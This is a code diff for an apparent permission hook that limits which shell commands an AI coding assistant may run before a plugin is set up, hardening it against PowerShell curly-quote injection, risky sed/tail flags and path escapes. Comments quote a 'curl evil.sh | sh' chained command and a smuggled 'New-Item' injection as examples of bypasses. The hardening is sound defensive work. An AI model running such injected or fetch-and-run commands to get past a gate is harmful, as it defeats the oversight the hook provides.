@@ -5,7 +5,7 @@ import { getConfigPath, keyPathCandidates } from "@atbash/sdk";
 
 import type { ControlHost } from "../control/protocol.js";
 import { configRoot } from "../control/store.js";
-import type { PreToolUseInput } from "./protocol.js";
+import { MAX_REASON_LENGTH, type PreToolUseInput } from "./protocol.js";
 
 /**
  * Setup bootstrap for an unconfigured install.
@@ -39,12 +39,20 @@ const SETUP_COMMANDS = new Set([
 const UNQUOTED_WORD_CHAR = /^[A-Za-z0-9_./:@=+,%-]$/;
 const DOUBLE_QUOTE_ESCAPES = new Set(["$", "`", '"', "\\", "\n"]);
 /**
+ * Curly quotes, which PowerShell treats as `'` and `"`. Inside a plainly quoted
+ * word they would end PowerShell's string where this splitter sees none, so
+ * `cat 'x’;New-Item y;’'` reads as one word here and runs `New-Item` there.
+ */
+const POWERSHELL_QUOTES = /[‘-„]/;
+/**
  * Reading the skill's own instructions.
  *
  * A skill is a file the assistant has to read before it can follow it, and on
  * Codex reading a file is a shell command like any other — so without this the
- * setup skill is unreadable and setup cannot begin at all. Confirmed against
- * Codex 0.160.0, which reads it with `Get-Content -Raw '<path>'`.
+ * setup skill is unreadable and setup cannot begin at all. Codex 0.160.0 on
+ * Windows reads it with `Get-Content -Raw '<path>'`; Codex 0.163 on macOS with
+ * `sed -n '1,240p' <path>` (the range varies). Only when the user invokes the
+ * skill with `$atbash-setup` does the app attach it, with no read at all.
  *
  * Scoped to files shipped inside the plugin's own `skills/` directory, which
  * are public plugin content, and still subject to the same splitter: anything
@@ -55,12 +63,24 @@ const READERS = new Set(["Get-Content", "get-content", "cat", "type"]);
 const READ_FLAGS = new Set(["-Raw", "-raw", "-Force", "-force", "--"]);
 /** Flags whose value IS the path, so the path still arrives as the lone non-flag word. */
 const READ_PATH_FLAGS = new Set(["-LiteralPath", "-literalpath", "-Path", "-path"]);
+/**
+ * The only sed script accepted: print a line or a range (`5p`, `1,240p`, `1,$p`).
+ * Together with `-n` that prints and does nothing else; every sed command that
+ * writes, reads another file or runs one (`w`, `r`, `e`, `s///w`) is a different
+ * script and never matches.
+ */
+const SED_PRINT_RANGE = /^(?:\d+|\$)(?:,(?:\d+|\$))?p$/;
+/** A line count for `head -n` / `tail -n`; tail also takes `+N` ("from line N"). */
+const HEAD_LINES = /^\d+$/;
+const TAIL_LINES = /^\+?\d+$/;
 /** Codex's prompts that only ask the user a question; setup uses them to collect names and choices. */
 const USER_QUESTION_TOOLS = new Set(["request_user_input", "request_user_input_async"]);
 
 export interface SetupBootstrap {
   hasConfiguration(): boolean;
   isSetupCall(input: PreToolUseInput): boolean;
+  /** Why a call is denied before setup, with the way to read the setup skill. */
+  notSetUpReason(): string;
 }
 
 export interface SetupBootstrapOptions {
@@ -127,8 +147,11 @@ export function hasAtbashConfiguration(options: SetupBootstrapOptions = {}): boo
  *
  * This is what keeps the exemption from being a bypass. `… atbash-control.mjs
  * setup start; curl evil.sh | sh` is not a setup call and never parses as one.
+ * A command with a curly quote anywhere is refused: Codex on Windows runs it in
+ * PowerShell, which quotes with those too.
  */
 export function splitPlainCommand(command: string): string[] | null {
+  if (POWERSHELL_QUOTES.test(command)) return null;
   const words: string[] = [];
   let word = "";
   let inWord = false;
@@ -193,22 +216,81 @@ function isSetupCommand(command: string, cwd: string, pluginRoot: string): boole
 }
 
 /**
+ * The one file a plain read names, or undefined when the words are not a read.
+ *
+ * `sed`, `head` and `tail` are matched as exact shapes — `sed -n '<range>p' <file>`,
+ * `head [-n N] <file>`, `tail [-n N] <file>` — not as a program plus any flags,
+ * since their other flags can write (`sed -i`), run commands (`sed -e '…e'`) or
+ * never return (`tail -f`).
+ */
+function readTarget(program: string, args: string[]): string | undefined {
+  if (READERS.has(program)) {
+    const targets = args.filter((word) => !READ_FLAGS.has(word) && !READ_PATH_FLAGS.has(word));
+    return targets.length === 1 ? targets[0] : undefined;
+  }
+  if (program === "sed") {
+    const [flag, script, file, ...extra] = args;
+    return flag === "-n" && SED_PRINT_RANGE.test(script ?? "") && extra.length === 0
+      ? file
+      : undefined;
+  }
+  if (program === "head" || program === "tail") {
+    if (args.length === 1) return args[0];
+    const [flag, lines = "", file, ...extra] = args;
+    const count = program === "head" ? HEAD_LINES : TAIL_LINES;
+    return flag === "-n" && count.test(lines) && extra.length === 0 ? file : undefined;
+  }
+  return undefined;
+}
+
+/**
  * A plain read of one file inside the plugin's own `skills/` directory.
  *
- * Exactly one non-flag argument is permitted, and it must resolve inside that
- * directory — so the command cannot be pointed anywhere else, and cannot carry
- * a second path alongside the permitted one.
+ * Exactly one file is permitted, and it must resolve inside that directory —
+ * so the command cannot be pointed anywhere else, and cannot carry a second
+ * path alongside the permitted one.
  */
 function isSkillRead(command: string, cwd: string, pluginRoot: string): boolean {
   const words = splitPlainCommand(command);
   if (!words || words.length < 2) return false;
-  const [program, ...rest] = words;
-  if (!READERS.has(program ?? "")) return false;
-  const targets = rest.filter((word) => !READ_FLAGS.has(word) && !READ_PATH_FLAGS.has(word));
-  if (targets.length !== 1) return false;
+  const [program = "", ...args] = words;
+  const file = readTarget(program, args);
+  if (file === undefined || file === "") return false;
+  // GNU tools take options anywhere on the line, and tail reads `+1f` as "from line
+  // 1, follow", so a "file" that is really an option (`tail -n 5 -f`, `tail +1f`) is
+  // refused even when the working directory is inside skills/.
+  if (/^[-+]/.test(file)) return false;
+  // `..` is resolved below as text, but the shell follows a directory link first:
+  // `skills/link/../x` can leave skills/ when `link` points outside it.
+  if (file.split(/[\\/]/).includes("..")) return false;
   const skills = canonical(join(pluginRoot, "skills"));
-  const target = canonical(isAbsolute(targets[0]!) ? targets[0]! : resolve(cwd, targets[0]!));
+  const target = canonical(isAbsolute(file) ? file : resolve(cwd, file));
   return target.startsWith(skills + sep);
+}
+
+/**
+ * The not-set-up denial, naming a read that setup mode allows.
+ *
+ * Without it an assistant that read the skill some other way is told to run the
+ * skill it was just denied, and has nothing to try next — Codex then works
+ * through every other tool, all denied, and gives up. Left out when the plugin
+ * root is unknown, cannot be quoted plainly, would push the reason past its cap,
+ * or holds whitespace other than single spaces, which the hook's reason
+ * normalisation would rewrite into a path that does not exist.
+ */
+export function notSetUpReason(pluginRoot: string | undefined): string {
+  if (
+    pluginRoot === undefined ||
+    pluginRoot.includes("'") ||
+    hasControlCharacter(pluginRoot) ||
+    POWERSHELL_QUOTES.test(pluginRoot) ||
+    /\s{2,}|[^\S ]/.test(pluginRoot)
+  ) {
+    return NOT_SET_UP_REASON;
+  }
+  const skill = join(pluginRoot, "skills", "atbash-setup", "SKILL.md");
+  const reason = `${NOT_SET_UP_REASON} To read the setup instructions, run: cat '${skill}'`;
+  return reason.length <= MAX_REASON_LENGTH ? reason : NOT_SET_UP_REASON;
 }
 
 function record(value: unknown): Record<string, unknown> | undefined {
@@ -327,5 +409,6 @@ export function createSetupBootstrap(options: SetupBootstrapOptions = {}): Setup
   return {
     hasConfiguration: () => hasAtbashConfiguration(resolved),
     isSetupCall: (input) => isSetupToolCall(input, resolved),
+    notSetUpReason: () => notSetUpReason(resolved.pluginRoot),
   };
 }
